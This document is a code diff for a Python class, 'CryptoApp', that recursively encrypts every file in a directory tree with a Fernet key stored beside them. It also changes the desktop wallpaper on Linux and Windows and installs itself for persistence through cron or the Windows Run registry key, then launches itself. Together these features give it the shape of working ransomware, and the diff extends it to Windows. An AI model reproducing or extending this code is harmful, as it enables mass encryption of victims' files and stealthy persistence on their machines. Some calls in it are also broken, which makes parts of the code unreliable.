@@ -1,28 +1,30 @@
 from cryptography.fernet import Fernet
-from typing import Dict
+from subprocess import call, run
+from typing import Optional
+import ctypes
 import sys
 import os
-from signal import SIGKILL
+import signal
 import json
-from subprocess import call, run
+import winreg
 
 
 class CryptoApp:
-    def __init__(self, startPath=None):
+    # CHECK
+    def __init__(self, startPath: str = None):
 
         # Init the starting path, and change the current directory to it
-        startPath = startPath or os.getcwd()
+        startPath: str = startPath or os.getcwd()
         os.chdir(startPath)
 
-        KEY_PATH = '.key'
+        KEY_PATH: str = '.key'
 
         # If the key exists, that means the files have been already encrypted
         if os.path.isfile(KEY_PATH):
             self.isEncrypted = True
 
             # Read the current fernet key
-            with open(KEY_PATH, 'rb') as file:
-                self.key = file.read()
+            self.key = self.readFile(KEY_PATH)
                 
         # If the files were not encrypted
         else:
@@ -34,7 +36,7 @@ class CryptoApp:
             
 
         # Initialize main variables
-        self.omittedFiles = ['.key', 'CryptoApp.py', 'index.py', '.cron_copy']
+        self.omittedFiles = ['.key', 'CryptoApp.py', 'index.py', '.cron_copy', '__pycache__']
         self.extensionsToModify = []
         self.KEY_PATH = os.path.abspath(KEY_PATH)
         self.startingPath = startPath
@@ -63,28 +65,37 @@ class CryptoApp:
         except: return None
 
 
+    # Run a shell script
+    def __runsh(self, command: str) -> None:
+        call(command, shell=True)
 
+
+    # CHECK
     # Handle the encrypt/decrypt actions
     def __actionHandler(self) -> None:
 
-        # Get the current directory files and filter ones that shouldn't be modified
-        files = list( filter(lambda x: x not in self.omittedFiles, os.listdir()) ) 
+        # Get the current directory files, and filter ones that shouldn't be modified
+        files: list = list(filter(
+            lambda x: x not in self.omittedFiles
+            , os.listdir()
+        )) 
 
         # Filter the file extensions
-        if len(self.extensionsToModify):
-            files = list( filter(lambda x: x.endswith(tuple(self.extensionsToModify)) or os.path.isdir(x), files) )
+        # if len(self.extensionsToModify):
+        files = list(filter(
+            lambda x: x.endswith(tuple(self.extensionsToModify)) or os.path.isdir(x)
+            , files
+        ))
 
 
         # Loop through each file
         for path in files:
             try:
-                isDir = os.path.isdir(path)
-
                 # If the "path" is directory, change the working directory
                 # Handle the files recursively, and finally return to the original directory
-                if isDir:
+                if os.path.isdir(path):
                     # Save the current path, and increment the dir count
-                    currentDir = os.getcwd()
+                    currentDir: str = os.getcwd()
                     self.countDirs += 1
 
                     os.chdir(path)
@@ -95,15 +106,15 @@ class CryptoApp:
 
 
                 # Read the file contents
-                old_text = self.readFile(path)
+                old_text: str = self.readFile(path)
                 if not old_text: continue
 
 
                 # Encrypt or decrypt the file
                 if self.isEncrypted:
-                    new_text = self.fernet.decrypt(old_text)
+                    new_text: str = self.fernet.decrypt(old_text)
                 else:
-                    new_text = self.fernet.encrypt(old_text)
+                    new_text: str = self.fernet.encrypt(old_text)
 
 
                 # Finally, write to the file its new content
@@ -124,36 +135,41 @@ class CryptoApp:
 
 
 
+    # CHECK
     # Choose which files will be skipped during encryption
-    def setFilesToSkip(self, files) -> None:
+    def setFilesToSkip(self, files: list) -> None:
         self.omittedFiles.extend(files)
 
 
-
+    # CHECK
     # Choose which file extensions will be encrypted (default any, which may cause very serious damage)
-    def setExtensionsToModify(self, extensions) -> None:
+    def setExtensionsToModify(self, extensions: list) -> None:
         self.extensionsToModify.extend(extensions)
 
 
 
+    # CHECK
     # Helper function for encrypting/decrypting
-    def enc_dec_helper(self, type) -> None:
-        if type == 'enc': prints = ['Encrypting...', 'Encrypted']
-        elif type == 'dec': prints = ['Decrypting...', 'Decrypted']
-        else: prints = ['', '']
+    def enc_dec_helper(self, type: str) -> None:
+        action: Optional[str] = None
 
-        print(f'[START] {prints[0]}\n')
+        if type == 'enc': action = 'Encrypting...'
+        elif type == 'dec': action = 'Decrypting...'
+
+        print(f'[START] {action}')
         self.__actionHandler()
-        print(f'\n[FINISH] {prints[1]} {self.countFiles} files')
+        print(f'[FINISH] {action[:7]}ed {self.countFiles} files')
 
 
 
+    # CHECK
     # Encrypt the files
     def encrypt(self) -> None:
         self.enc_dec_helper('enc')
 
 
 
+    # CHECK
     # Decrypt the files
     def decrypt(self) -> None:
         self.enc_dec_helper('dec')
@@ -161,58 +177,55 @@ class CryptoApp:
         os.remove(self.KEY_PATH)
 
 
-
+    # CHECK
     # Determine the OS, and DE, if on Linux
-    # Returns a dictionary with a "os" and "de" fields
-    def determineOS(self) -> Dict[str, str]:
-        os_info = { "os": "", "de": "" }
+    # Returns a list with a two elements that represent os and optionally desktop environment
+    def determineOS(self) -> list:
+        os_info: Optional[str] = None
+        de: Optional[str] = None
 
         # Get the OS
         if sys.platform in ['linux2', 'linux']:
-            os_info["os"] = 'linux'
+            os_info = 'linux'
         elif sys.platform == 'darwin':
-            os_info["os"] = 'mac'
+            os_info = 'mac'
         elif sys.platform in ['win32', 'cygwin']:
-            os_info["os"] = 'windows'
-
+            os_info = 'windows'
 
         # Get the DE
-        if os_info["os"] == 'linux':
-            de = None
-
+        if os_info == 'linux':
             match os.environ.get("DESKTOP_SESSION"):
                 case 'ubuntu': de = 'gnome'
                 case 'kubuntu': de = 'kde'
                 case 'xfce': de = 'xfce4'
                 case _: de = os.environ.get("DESKTOP_SESSION")
 
-
-            os_info["de"] = de
-
-
-        return os_info            
+        return [os_info, de]            
 
 
 
     # Set the wallpaper image
-    def setDesktopBG(self, target_os, target_de, file) -> None:
-        # Return if a file is not truthy
-        if not file: return
-            
-        # Get the absolute path of a file
-        abs_path = os.path.abspath(file)
-
+    def setDesktopBG(self, target_os: str, target_de: str, file: str) -> None:
         try:
+            abs_path: str = os.path.abspath(file)
+
+            # Linux distros
             if target_os == 'linux':
                 # Xfce4 Desktop. Tested with Virtual and monitor0. Not sure about the others
                 if target_de == 'xfce4':
                     for monitor in ['Virtual1', '0']:
-                        call(f'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor{monitor}/workspace0/last-image -s {abs_path} 2>/dev/null', shell=True)
+                        self.__runsh(f'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor{monitor}/workspace0/last-image -s {abs_path} 2>/dev/null')
 
                 # GNOME
                 if target_de == 'gnome':
                     for style in ['picture-uri', 'picture-uri-dark']:
-                        call(f'gsettings set org.gnome.desktop.background {style} file://{file}', shell=True)
+                        self.__run(f'gsettings set org.gnome.desktop.background {style} file://{abs_path}')
+
+            # Windows
+            if target_os == 'windows':
+                SPI_SET: int = 0x14
+
+                ctypes.windll.user32.SystemParametersInfoW(SPI_SET, 0, abs_path, 0)
 
         except:
             print('[ERROR] Could not change a wallpaper')
@@ -220,10 +233,11 @@ class CryptoApp:
 
 
     # Get the current wallpaper image
-    def getDesktopBG(self, target_os, target_de) -> str | None:
+    def getDesktopBG(self, target_os: str, target_de: str) -> str | None:
         output = None
 
         try:
+            # Linux distros
             if target_os == 'linux':
                 # Xfce4 Desktop. Tested with Virtual and monitor0. Not sure about the others
                 if target_de == 'xfce4':
@@ -231,52 +245,112 @@ class CryptoApp:
                         result = self.__getsh(f'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor{x}/workspace0/last-image')
 
                         # Remove the line break
-                        out = result.rstrip()
-                        if out: return out
+                        output = result.rstrip()
+                        if output: break
 
                 # GNOME. Get the dark theme
                 elif target_de == 'gnome':
                     result = self.__getsh('gsettings get org.gnome.desktop.background picture-uri-dark')
                     
                     # Remove the "file://" and '' to get a clear url
-                    output = result.rstrip().replace('file://', '').replace("'", '')
+                    output: str = result.rstrip().replace('file://', '').replace("'", '')
+
+            # Windows
+            if target_os == 'windows':
+                MAX: int = 260
+                SPI_GET: int = 0x73
+
+                buf = ctypes.create_unicode_buffer(MAX)
+                ctypes.windll.user32.SystemParametersInfoW(SPI_GET, MAX, buf, 0)
+
+                output = buf.value
+
 
             return output
 
         except:
             print('[ERROR] Could not get a wallpaper')
-            return None    
 
 
+    # Launch a specified script on startup using windows registry (windows)
+    def registryStartupAction(self, target_os: str, type: str, scriptToStart: str = '') -> None:
+        # Check the OS
+        if target_os != 'windows':
+            print(f'[ERROR] Modyifying registry on {target_os}')
+            return
 
-    # Launch a specified script on startup using cron
-    def cronAction(self, target_os, type, scriptToStart):
+        # Check if a script exists
+        if not os.path.isfile(scriptToStart):
+            print(f'[ERROR]: Script {scriptToStart} not found')
+            return
+
+
+        key:        str  = r'Software\Microsoft\Windows\CurrentVersion\Run'
+        key_name:   str  = 'win_reg_start'
+        abs_path:   str  = os.path.abspath(scriptToStart)
+
+        # Open the RUN registry
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as reg_key:
+            p, ex = os.path.splitext(abs_path)
+
+            try:
+                if type == 'start':
+                    # .py extension script
+                    if ex in ['.py', '.pyw']:
+                        bat_path: str = f'{p}.bat'
+
+                        # Create a batch file that executes user's script
+                        with open(bat_path, 'w') as file:
+                            file.write(f'@echo off\npython {abs_path} %*')
+
+                        abs_path = bat_path
+
+                    # Return if an extension is different than .bat
+                    elif ex != '.bat':
+                        print(f'[ERROR] {ex} extension is not supported')
+                        return
+
+                    # Set the registry and run the script immediately
+                    winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, abs_path)
+                    run([abs_path])
+
+                # Remove a startup script from the registry
+                elif type == 'stop':
+                    winreg.DeleteValue(reg_key, key_name)
+
+            except:
+                print('[ERROR] Handling startup script failed')
+
+
+    # Launch a specified script on startup using cron (unix like)
+    def cronStartupAction(self, target_os: str, type: str, scriptToStart: str = '') -> None:
         # Check the OS
         if target_os not in ['linux', 'mac']:
             print(f'[ERROR] Running cron on {target_os}')
             return
 
         # Check if cron is installed
-        doesExist = self.__getsh('which crontab')
+        doesExist: Optional[str] = self.__getsh('which crontab')
         if not doesExist or 'not found' in doesExist:
             print('[ERROR] cron is not installed on the system')
             return
 
 
         # File to save the original cron settings to
-        CRON_ORIGINAL = '.cron_copy'
+        CRON_ORIGINAL: str = '.cron_copy'
 
         if type == 'start':
-            CRON_ARG = 'crontab_arg'
+            CRON_ARG: str = 'crontab_arg'
 
             # Check if a script exists
             if not os.path.isfile(scriptToStart):
                 print(f'[ERROR]: Script {scriptToStart} not found')
                 return
 
+            scriptToStart = os.path.abspath(scriptToStart)
 
             # Get and save the current cron settings
-            current = self.__getsh('crontab -l')
+            current: str = self.__getsh('crontab -l')
             self.writeFile(CRON_ORIGINAL, current)
 
             # Add a new entry
@@ -284,33 +358,30 @@ class CryptoApp:
             self.writeFile(CRON_ARG, current)
             
             # Save the new cron settings and run the script
-            call(f'crontab {CRON_ARG}', shell=True)
-            call(f'python3 {scriptToStart} &', shell=True)
+            self.__runsh(f'crontab {CRON_ARG}')
+            self.__runsh(f'python3 {scriptToStart} &')
             os.remove(CRON_ARG)
-
-            print('[INFO] script launched')
-
 
         elif type == 'stop' and os.path.isfile(CRON_ORIGINAL):
             # Revert to the original cron settings
-            call(f'crontab {CRON_ORIGINAL}', shell=True)
+            self.__runsh(f'crontab {CRON_ORIGINAL}')
             os.remove(CRON_ORIGINAL)
 
             try:
                 # Get the PID of the process
-                pid = self.__getsh(f"ps -aux | grep {scriptToStart} | awk '{{print $2}}'").split('\n')[0]
+                pid: int = int(self.__getsh(f"ps -aux | grep {scriptToStart} | awk '{{print $2}}'").split('\n')[0])
 
                 # And terminate that process
-                if pid and pid.isnumeric():
-                    os.kill(int(pid), SIGKILL)
-                    print('[INFO] script has been stopped')
+                if pid:
+                    os.kill(pid, signal.SIGKILL)
 
             except: return
 
 
 
+    # CHECK
     # Write to the file
-    def writeFile(self, path, val) -> None:
+    def writeFile(self, path: str, val: str) -> None:
         mode = 'wb' if isinstance(val, bytes) else 'w'
 
         with open(path, mode) as file:
@@ -318,23 +389,24 @@ class CryptoApp:
 
 
 
+    # CHECK
     # Read the file contents
-    def readFile(self, path) -> str | None:
-        if not os.path.isfile(path):
-            print(f'[ERROR] File: {path} does not exist')
-            return None
+    def readFile(self, path: str) -> str | None:
+        try:
+            with open(path, 'rb') as file:
+                return file.read()
 
-        with open(path, 'rb') as file:
-            return file.read()
+        except:
+            raise Exception(f'[ERROR] File: {path} does not exist')
 
 
-
-    # Returns True, if the files were already encrypted (if the key.txt is present)    
+    # CHECK
+    # Returns True, if the files were already encrypted (or if the key.txt is present)    
     def isAlreadyEncrypted(self) -> bool:
         return self.isEncrypted
 
     
-
-    # Get the total affected files and directories
-    def getCount(self) -> Dict[str, int]:
-        return { "dirs": self.countDirs, "files": self.countFiles }
+    # CHECK
+    def getCount(self) -> list:
+    # Get a list of a total affected files and directories
+        return [self.countFiles, self.countDirs]
